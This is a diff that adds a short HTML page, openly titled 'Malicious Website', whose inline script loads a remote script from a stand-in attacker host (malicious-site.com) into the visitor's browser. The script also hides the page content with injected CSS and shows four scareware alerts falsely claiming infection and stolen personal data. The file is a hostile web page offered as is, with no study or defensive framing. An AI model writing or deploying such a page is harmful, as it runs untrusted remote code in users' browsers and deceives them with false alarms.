@@ -1,0 +1,25 @@
+<html>
+<head>
+<title>Malicious Website</title>
+</head>
+<body>
+<script>
+// This script will manipulate the user's browser
+
+// Inject malicious code into the user's browser
+var script = document.createElement("script");
+script.src = "https://malicious-site.com/malicious-script.js";
+document.body.appendChild(script);
+
+// Modify the user's browser's behavior
+var style = document.createElement("style");
+style.innerHTML = "body { display: none; }";
+document.head.appendChild(style);
+// This script will pop up a bunch of stuff
+alert("You have been hacked!");
+alert("Your computer has been infected with malware!");
+alert("Your personal information has been stolen!");
+alert("You should change your password immediately!");
+</script>
+</body>
+</html>
